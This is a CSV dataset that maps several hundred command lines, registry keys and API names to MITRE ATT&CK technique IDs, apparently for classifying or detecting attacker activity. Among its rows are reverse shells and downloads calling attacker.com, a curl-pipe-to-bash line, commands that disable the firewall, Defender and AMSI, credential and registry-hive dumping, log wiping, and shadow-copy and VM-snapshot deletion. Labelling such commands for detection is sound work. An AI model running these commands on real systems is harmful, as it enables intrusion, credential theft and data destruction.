command,mitre_id
kubectl get secrets --all-namespaces,T1552
reg save HKLM\SYSTEM $extract_path\SYSTEM_HIVE,T1003
"grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf",T1562
aws logs create-log-group --log-group-name $cloudwatch_log_group_name --region $region --output json,T1562
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d $new_executable /f,T1112
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0”,T1112
ld.so,T1574
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name,T1069
Temp\ModeAuto\icons,T1113
if (!$Computer) { Continue },T1018
"Start-Process ""C:\Windows\System32\fodhelper.exe""",T1548
move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll,T1036
"kubectl run $pod_name --image=$image_name --restart=Never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '$at_command' | at $time_spec && at -l""",T1053
"Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""$target_user""",T1098
echo '//! DATA' >/path/to/temp-file,T1222
netstat -naop tcp,T1049
mkdir $file_or_folder >nul 2>&1,T1222
"""$lazagne_path"" browsers",T1555
"""$uacme_exe""",T1548
chmod +x $rc_service_path/$rc_service_file,T1543
logrotate /path/to/input-file,T1005
New-PSDrive -name $map_name -psprovider filesystem -root \\$computer_name\$share_name,T1021
echo Password!>> passwords.txt,T1110
. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke {CMD},T1216
authd,T1055
"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",T1218
"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",T1105
net start spooler,T1547
clear history,T1070
"set-content -path . -stream $ads_filename -value ""test3""",T1564
forfiles.exe,T1202
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""$target_key_value_name"" -Value ""$payload""",T1547
apport-cli -f,T1548
msserver.exe,T1570
"compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force",T1555
"echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002",T1543
API:{uuid},T1558
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost,T1547
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows,T1060
Function Search-Files {,T1005
vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},T1127
"Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""",T1218
dd of=$file_to_overwrite if=$overwrite_source count=$(ls -l $file_to_overwrite | awk '{print $5}') iflag=count_bytes,T1485
compareForfor.jpg,T1036
Remove-Variable xlApp,T1204
/run/udev/rules.d/,T1546
setfattr,T1564
echo DATA | openssl enc -out /path/to/output-file,T1222
timestamp_timeout,T1548
yarn --cwd .,T1059
"sudo emacs -Q -nw --eval '(term ""/bin/sh &"")'",T1059
curl http://attacker.com/path/to/input-file -o /path/to/output-file,T1105
C:\Windows\System32\DisplaySwitch.exe,T1546
"cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null",T1036
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y,T1036
netsh,T1562
PostMessage,T1055
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1',T1059
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""$inf_to_execute""",T1218
/var/log/kern.log,T1070
cmd.exe /c eventvwr.msc,T1548
"$instance.Document.Application.ShellExecute($driveLetter+"":\document.lnk"","""",$driveLetter+"":\"",$null,0)",T1553
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f,T1112
zip -r,T1560
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")",T1218
echo '' > /var/log/messages,T1070
setfile -a V $filename,T1564
urlget - /path/to/input-file,T1005
MQTT,T1071
%temp%\T1036.007_masquerading.xls.vbs,T1036
Profile,T1083
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue),T1083
C:\program.exe,T1574
stordiag.exe,T1218
cp /path/to/dir/path/to/input-file /path/to/output-file,T1105
sudo chown root /tmp/hello,T1548
GetModuleFileName,T1106
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,T1127
sudo pkill -SIGTERM $process_pattern,T1489
sudo cp $path_malicious_plist /tmp/T1037_005_agent.plist,T1037
"Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""",T1098
busybox ash,T1548
echo '...' >Vagrantfile,T1548
ShellExecuteW,T1106
"cd ""PathToAtomicsFolder\ExternalPayloads\""",T1001
"sysctl -n ""/../../path/to/input-file""",T1005
gawk '//' /path/to/input-file,T1005
cmd /c start /b psr.exe /start /output $output_file /sc 1 /gui 0 /stopevent 12,T1113
"$sheet.Cells.Item(7,1) = ""=FWRITELN(A5, `""`"")""",T1204
wmic path win32_VideoController get name,T1082
"Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",T1553
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket,T1059
evil.bin,T1036
WFMFormat.exe,T1127
Import-Module AzureAD,T1098
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f",T1562
"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f",T1078
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",T1218
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""",T1485
lPH*.dll,T1083
"rundll32.exe {PATH_SMB:.dll},EntryPoint",T1218
netsh.exe firewall show config,T1518
find $search_path -name id_rsa 2>/dev/null >> $output_file,T1552
if [ ! -d $mount_point ]; then mkdir $mount_point ; mount $mount_device $mount_point; fi,T1611
head,T1140
"if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" -destination ""$exfil_folder\T1555.003Chrome_Login Data""} else {}",T1555
foreach ($account in $storageAccounts) {,T1619
/bin/sh -c,T1059
sed -i '$ a #art_test_1562_006_1' /etc/audisp/$audisp_config_file_name,T1562
"foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }",T1083
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f",T1112
"& $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&""",T1218
AppLauncher.exe {PATH_ABSOLUTE:.exe},T1127
otherchecks -noninteractive -consoleoutput,T1082
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /f",T1546
./aws_secret.sh,T1098
"if ($app -eq $null) { Write-Warning ""Application not found""; exit }",T1098
takeown,T1222
"Try {cmd /c ""$AdvancedRun_Location"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}",T1562
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe,T1547
Set-Location Cert:\LocalMachine\My,T1552
certutil -decodehex {PATH:.hex} {PATH},T1140
reg.exe add HKCU\Software\Microsoft\Office\$outlook_version\Outlook\WebView\$outlook_folder /v URL /t REG_SZ /d $url /f,T1137
end;,T1059
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,T1222
aws ec2 describe-instances --filter file:///path/to/input-file,T1005
LastAccessTime,T1070
join -a 2 /dev/null /path/to/input-file,T1005
tdbdump,T1003
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue,T1547
"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""$command_to_execute""),0)",T1218
bluekeep -noninteractive -consoleoutput,T1046
pw useradd $username -s /usr/sbin/nologin -d /nonexistent -c evil_account,T1136
echo $fish_encoded | base64 -d | bash,T1140
RegisterModule,T1505
ar r /path/to/output-file /path/to/input-file,T1005
fsianycpu.exe,T1059
DuplicateTokenEx,T1134
libcurl.dll,T1574
Dim schTasksCmd As String,T1137
sudo cp $path_malicious_plist /tmp/T1037_005_daemon.plist,T1037
SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},T1218
Test-NetConnection -CommonTCPPort HTTP -ComputerName $target,T1016
"$ADSearch.Filter=""(l=$keyObjectGuid)""",T1552
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml,T1222
SilentCleanup,T1053
diskshadow delete shadows all,T1490
sudo make /tmp/hello,T1548
New-Item $rclone_config_path\rclone -ItemType directory,T1567
DescribeDBInstances,T1580
"cmd /c ""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `""$File_to_Encrypt_Location`""""",T1486
"&""$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"" -LogPath $filepath",T1056
requestbin.net,T1071
"Write-Host ""Error: AADInternals could not connect""",T1484
GetProcessesByName,T1057
"& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n $process_name",T1562
GetLastError,T1106
"local b=assert(f:read(""*a""));c:send(b);",T1059
"Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse",T1562
"$ShortCut.Description = ""T1547.009."";",T1547
echo '/path/to/command' >/path/to/temp-dir/bin/rustc,T1059
%APPDATA%\..\Local Settings\Temporary Internet Files\Content.Word\,T1070
ash,T1059
/var/log/wtmp,T1070
"sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1""",T1036
"https://"" & domain & ""/agent/scripts/"" & moduleName & "".applescript",T1105
ToolHelp32,T1106
"netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes",T1562
xbootmgrsleep.exe 1000 {PATH:.exe},T1202
"& ""$pua_file""",T1204
mkdir c:\exfil,T1003
ps ax | grep <name> | grep -v grep | ...,T1057
"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *",T1482
"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",T1218
FONTCACHE.DAT,T1070
LSADUMP::ChangeNTLM,T1098
look '' /path/to/input-file,T1005
"usermod --expiredate ""1"" art",T1078
dstat --xxx,T1548
$AuthenticationPackagesValues += $passwordFilterName,T1556
hha.dll,T1036
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5",T1559
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer /t REG_SZ /d ""proxy.atomic-test.com:8080"" /f",T1112
ansible-test shell,T1059
ExecStartPost,T1543
tasksh,T1059
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force",T1547
%USERPROFILE%\Recent,T1083
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file,T1059
ResumeThread,T1055
ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,T1136
pcalua.exe -a $process,T1202
if ($LASTEXITCODE -eq 0) {,T1528
reg.exe,T1003
Connect-MgGraph,T1021
reg export HKLM\system %temp%\system,T1003
"ruby -e 'exec ""/bin/sh""'",T1059
"echo ""import os; os.system('date > /tmp/poc.txt')"" > ""$USER_PACKAGES/usercustomize.py""",T1546
[Definition],T1059
systemctl enable $systemd_timer_name,T1053
"if ($ipAddr -eq """") {",T1046
sh.stdout.pipe(client);,T1059
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f",T1112
PTRACE_POKEDATA,T1055
"echo """" | ""$plink_file"" ""$vm_host"" -ssh -l ""$vm_user"" -pw ""$vm_pass"" -m ""$vib_install""",T1129
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""",T1112
esxcli network diag ping,T1018
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,T1059
file */* *>> $output_file,T1083
"reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""",T1012
$which_openssl rsautl -encrypt -inkey $public_key_path -pubin -in $input_file_path -out $encrypted_file_path,T1486
Add-Type -AssemblyName System.Windows.Forms,T1113
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,T1060
ucmDccwCOMMethod,T1548
Label,T1543
reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default”,T1012
crash -h,T1548
df -aH,T1135
"Write-Host "" [-] $username:${password} invalid credentials.`r`n""",T1110
"echo 'echo ""T1027.013: Payload extracted from encrypted ZIP""' >> /tmp/art_payload.sh",T1027
"(root permissions),",T1564
Start-Sleep -Seconds 7,T1027
echo $dash_encoded | b64decode -r | sh,T1140
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""",T1112
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));',T1140
plutil -p ${FILE},T1547
"$sheet.Cells.Item(15,1) = ""=FWRITELN(A5, `""oStream.Write winHttp.responseBody`"")""",T1204
while(pi.available()>0)so.write(pi.read());,T1059
". ""$test_harness""",T1218
go run $input_file,T1027
Get-ADGroupMember,T1087
DisplayName = $p.DisplayName,T1007
yum install http://attacker.com/path/to/input-file.rpm,T1105
GetIpAddrTable,T1016
mount /dev/sda1 /mnt/,T1059
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $output_file,T1218
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f",T1112
ScreenConnect,T1219
user locale of (get system info),T1614
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""delete {GUID}"" ""quit"" ""quit""",T1003
nltest,T1016
nc -l -p 12345 -e /bin/sh,T1059
"New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force",T1548
.exe,T1574
tar cf /dev/stdout /path/to/input-file -I 'tar xO',T1005
"bash -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'",T1105
